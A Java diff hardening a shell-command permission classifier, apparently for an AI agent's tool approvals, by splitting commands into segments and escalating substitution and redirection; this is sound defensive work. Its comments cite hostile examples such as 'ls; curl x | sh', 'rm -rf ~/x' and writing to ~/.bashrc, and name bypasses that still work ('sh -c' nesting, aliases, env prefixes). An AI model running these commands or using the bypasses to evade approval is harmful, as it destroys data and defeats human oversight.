@@ -34,10 +34,15 @@ import java.util.Map;
  * <b>确实会改东西</b>的命令上。逼用户把它们写进只读表，等于让他对系统说谎，
  * 而这份谎话会掩盖「我为什么信任这条命令」。两个键的<b>审批口径相同</b>（都不打扰），语义各归其位。
  * <p>
- * <b>分类器不是安全边界，这一点必须写清楚</b>：它按命令原文的前缀匹配，
- * {@code FOO=bar cmd}、{@code $(...)}、别名、{@code sh -c} 嵌套都能绕过它。
- * 它的价值在于避免用户因为嫌烦而把 {@code shell} 从 {@code askTools} 里整个拿掉——
- * 那才是真正的风险。真正的边界是审批本身加上白名单。
+ * <b>判定按「段」而不是按整串</b>：原文先按未引用状态下的 {@code ;}、{@code |}、{@code &} 与换行
+ * 切成子命令，每段都要各自过白名单、可信表与只读表，最后取最严的结果。少这一步的话，
+ * {@code ls; curl x | sh} 会因为第一个 token 是只读的 {@code ls} 而整串免审批。
+ * 命令替换（{@code $(...)}、反引号）与重定向（{@code >}、{@code <}）会把真正的动作藏在原文后半段，
+ * 而前缀匹配看不见那里，因此含这些构造时一律升级为人工审批。
+ * <p>
+ * <b>即便如此，它也不是安全边界，这一点必须写清楚</b>：{@code FOO=bar cmd}、别名、
+ * {@code sh -c} 嵌套仍然能绕过前缀判定。它的价值在于避免用户因为嫌烦而把 {@code shell}
+ * 从 {@code askTools} 里整个拿掉——那才是真正的风险。真正的边界是审批本身加上白名单。
  * <p>
  * <b>刻意保守的三条</b>：{@code find} 不在只读表里（{@code find -delete}）、
  * {@code git fetch} / {@code git push} 不在（会改远端与本地 ref）、
@@ -77,11 +82,15 @@ final class CommandPolicy {
      * 内置只读命令表。
      * <p>
      * 单 token 条目匹配该命令的全部子命令；带空格的条目只匹配该二元前缀。
+     * <p>
+     * <b>没有 {@code git branch} 与 {@code git remote}</b>：这两个命令名既有查询子命令也有改写子命令
+     * （{@code git branch -D}、{@code git remote remove}），而表是按前两个 token 匹配的，
+     * 收它们进来等于让改动作免审批。它们与 {@code find}、{@code git fetch} 属于同一类误判点。
      */
     static final List<String> DEFAULT_READ_ONLY_COMMANDS = Collections.unmodifiableList(Arrays.asList(
             "ls", "cat", "head", "tail", "wc", "pwd", "echo", "which", "type", "date", "uname",
             "whoami", "id", "df", "du", "ps", "stat", "file",
-            "git status", "git log", "git diff", "git show", "git branch", "git remote", "git rev-parse",
+            "git status", "git log", "git diff", "git show", "git rev-parse",
             "npm ls", "pnpm ls"));
 
     /**
@@ -222,34 +231,232 @@ final class CommandPolicy {
     /**
      * 给出这次命令调用的权限裁定。
      * <p>
-     * 顺序即优先级：白名单（默认拒绝）→ 拒绝形状 → 可信表（免审批）→ 只读 → 其余问人。
+     * 顺序即优先级：分段 → 白名单（默认拒绝，逐段）→ 拒绝形状 → 可信表（免审批，全段命中才认）
+     * → 命令替换 / 重定向（升级问人）→ 只读（逐段）→ 其余问人。
      * 白名单、可信表与拒绝形状<b>都不受 {@code commandPolicy.enabled} 影响</b>：那个开关关掉的是
      * 「分类器」这个便利机制，不是用户明确声明的约束。
      * <p>
+     * <b>逐段判定是本方法的核心</b>：执行侧是 {@code /bin/sh -c 原文}，一段命令里的分隔符
+     * （{@code ;}、{@code &&}、{@code |}、换行）之后可以跟任何东西，而前缀匹配只看得到开头。
+     * 因此每一段都要独立过一遍表，任何一段不过就按不过的那一段给结论。
+     * <p>
+     * <b>可信表要「全段命中」才算数</b>：只匹配第一段的话，
+     * {@code trustedCommands: ["mvn test"]} 会把 {@code mvn test; rm -rf ~/x} 一并免审批。
+     * <p>
      * <b>可信表排在拒绝形状之后是刻意的</b>：把 {@code rm} 写进可信表，{@code rm -rf /} 依旧被拒——
      * 免审批回答的是「要不要问人」，不是「连灾难形状也放行」。
+     * <p>
+     * <b>命令替换与重定向独立于只读表</b>：{@code echo evil > ~/.bashrc} 的第一个 token 是只读的
+     * {@code echo}，{@code ls $(rm -rf x)} 同理——只看前缀无法察觉后半段的动作，因此一律升级为问人。
      *
      * @param command 命令原文，不可为 {@code null}
      * @return 权限裁定，保证非 {@code null}
      */
     PermissionVerdict verdict(String command) {
-        if (!allowedCommands.isEmpty() && !matchesPrefix(allowedCommands, command)) {
-            return PermissionVerdict.deny("命令不在 allowedCommands 白名单内：" + firstToken(command));
+        Segments segments = splitSegments(command);
+        if (!segments.judgeable) {
+            // 引号没闭合时原文的语义取决于 shell 怎么报错，这里没有可靠的判定依据，不能假设它无害
+            return PermissionVerdict.ask("命令的引号未闭合，无法判定，需要确认");
         }
+        if (segments.parts.isEmpty()) {
+            return PermissionVerdict.ask("命令为空，需要确认");
+        }
+        if (!allowedCommands.isEmpty()) {
+            for (String segment : segments.parts) {
+                if (!matchesPrefix(allowedCommands, segment)) {
+                    return PermissionVerdict.deny("命令不在 allowedCommands 白名单内：" + firstToken(segment));
+                }
+            }
+        }
+        // 拒绝形状按原文匹配：`rm -rf /` 被拆成几段也仍然是那个形状
         String denied = matchedDeniedPattern(command);
         if (denied != null) {
             return PermissionVerdict.deny("命令匹配拒绝形状：" + denied);
         }
-        if (matchesPrefix(trustedCommands, command)) {
+        if (!trustedCommands.isEmpty() && allMatchPrefix(trustedCommands, segments.parts)) {
             return PermissionVerdict.abstain();
         }
         if (!enabled) {
             return PermissionVerdict.abstain();
         }
-        if (classify(command) == Classification.READ_ONLY) {
-            return PermissionVerdict.abstain();
+        if (hasOpaqueConstruct(command)) {
+            return PermissionVerdict.ask("命令含命令替换或重定向，需要确认：" + firstToken(command));
         }
-        return PermissionVerdict.ask("执行 shell 命令需要确认：" + firstToken(command));
+        for (String segment : segments.parts) {
+            if (classify(segment) == Classification.READ_ONLY) {
+                continue;
+            }
+            return PermissionVerdict.ask("执行 shell 命令需要确认：" + firstToken(segment));
+        }
+        return PermissionVerdict.abstain();
+    }
+
+    /**
+     * 判断每一段是否都命中某个前缀表。
+     *
+     * @param table    前缀表，不可为 {@code null}
+     * @param segments 已切分的子命令，不可为 {@code null}
+     * @return 全部命中返回 {@code true}
+     */
+    private static boolean allMatchPrefix(List<String> table, List<String> segments) {
+        for (String segment : segments) {
+            if (!matchesPrefix(table, segment)) {
+                return false;
+            }
+        }
+        return true;
+    }
+
+    /**
+     * 按未引用状态下的分隔符切分命令原文。
+     * <p>
+     * 引号内的分隔符是字面量（{@code echo "a;b"} 是一条命令），因此必须带引号状态扫描；
+     * 反斜杠转义下一个字符，因此 {@code \;} 也不切分。{@code &&} 与 {@code ||} 整体消费成一个分隔符。
+     * <p>
+     * 引号未闭合时返回不可判定的结果：那种原文连 shell 自己都会报错退出，
+     * 我们据此加一个「问人」比猜一个结论安全。
+     *
+     * @param command 命令原文，可为 {@code null}
+     * @return 分段结果，保证非 {@code null}
+     */
+    private static Segments splitSegments(String command) {
+        List<String> parts = new ArrayList<String>();
+        if (command == null) {
+            return new Segments(parts, true);
+        }
+        StringBuilder current = new StringBuilder();
+        char quote = 0;
+        for (int i = 0; i < command.length(); i++) {
+            char c = command.charAt(i);
+            if (quote == '\'') {
+                // 单引号内一切都是字面量，包括反斜杠
+                if (c == '\'') {
+                    quote = 0;
+                }
+                current.append(c);
+                continue;
+            }
+            if (c == '\\') {
+                current.append(c);
+                if (i + 1 < command.length()) {
+                    current.append(command.charAt(++i));
+                }
+                continue;
+            }
+            if (c == '\'' || c == '"') {
+                quote = quote == c ? 0 : c;
+                current.append(c);
+                continue;
+            }
+            if (quote == 0 && isSeparator(c)) {
+                addSegment(parts, current);
+                if (i + 1 < command.length() && command.charAt(i + 1) == c && (c == '&' || c == '|')) {
+                    // `&&` / `||` 是一个分隔符，不是两个
+                    i++;
+                }
+                continue;
+            }
+            current.append(c);
+        }
+        addSegment(parts, current);
+        return new Segments(parts, quote == 0);
+    }
+
+    /**
+     * 判断字符是否是未引用状态下会切分命令的分隔符。
+     *
+     * @param c 字符
+     * @return 是分隔符返回 {@code true}
+     */
+    private static boolean isSeparator(char c) {
+        return c == ';' || c == '|' || c == '&' || c == '\n' || c == '\r';
+    }
+
+    /**
+     * 把当前累积的文本作为一段收下，空白段丢弃。
+     *
+     * @param parts   分段结果
+     * @param current 当前累积文本，收下后清空
+     */
+    private static void addSegment(List<String> parts, StringBuilder current) {
+        String text = current.toString().trim();
+        current.setLength(0);
+        if (!text.isEmpty()) {
+            parts.add(text);
+        }
+    }
+
+    /**
+     * 判断原文是否含「前缀判定看不见的构造」：命令替换与重定向。
+     * <p>
+     * {@code $(...)} 与反引号在双引号里<b>照样会执行</b>，因此只把单引号当安全区；
+     * 重定向 {@code >} / {@code <} 在双引号里是字面量，所以两种引号都要排除它。
+     *
+     * @param command 命令原文，可为 {@code null}
+     * @return 含这类构造返回 {@code true}
+     */
+    private static boolean hasOpaqueConstruct(String command) {
+        if (command == null) {
+            return false;
+        }
+        char quote = 0;
+        for (int i = 0; i < command.length(); i++) {
+            char c = command.charAt(i);
+            if (quote == '\'') {
+                if (c == '\'') {
+                    quote = 0;
+                }
+                continue;
+            }
+            if (c == '\\') {
+                i++;
+                continue;
+            }
+            if (c == '\'') {
+                quote = '\'';
+                continue;
+            }
+            if (c == '"') {
+                quote = quote == '"' ? 0 : '"';
+                continue;
+            }
+            if (c == '`') {
+                return true;
+            }
+            if (c == '$' && i + 1 < command.length() && command.charAt(i + 1) == '(') {
+                return true;
+            }
+            if (quote == 0 && (c == '>' || c == '<')) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    /**
+     * 命令原文的分段结果。
+     * <p>
+     * 独立成值对象而不是返回 {@code List} 加一个布尔参数：调用点读作
+     * {@code segments.judgeable} / {@code segments.parts} 比记住「空列表有两重含义」清楚。
+     */
+    private static final class Segments {
+
+        /** 子命令列表，已去空白且丢弃空段。 */
+        private final List<String> parts;
+
+        /** 原文是否可判定（引号闭合）。 */
+        private final boolean judgeable;
+
+        /**
+         * 构造分段结果。
+         *
+         * @param parts     子命令列表
+         * @param judgeable 是否可判定
+         */
+        private Segments(List<String> parts, boolean judgeable) {
+            this.parts = parts;
+            this.judgeable = judgeable;
+        }
     }
 
     /**
@@ -283,9 +490,12 @@ final class CommandPolicy {
     }
 
     /**
-     * 分类命令原文。
+     * 分类一段命令文本。
+     * <p>
+     * <b>入参必须是单段</b>（{@link #verdict} 切分后的任意一段）：它按前缀匹配，
+     * 直接把 {@code ls; rm -rf /} 整串丢进来会得出「只读」这个错误结论。
      *
-     * @param command 命令原文，不可为 {@code null}
+     * @param command 单段命令文本，不可为 {@code null}
      * @return 分类结果，保证非 {@code null}
      */
     Classification classify(String command) {
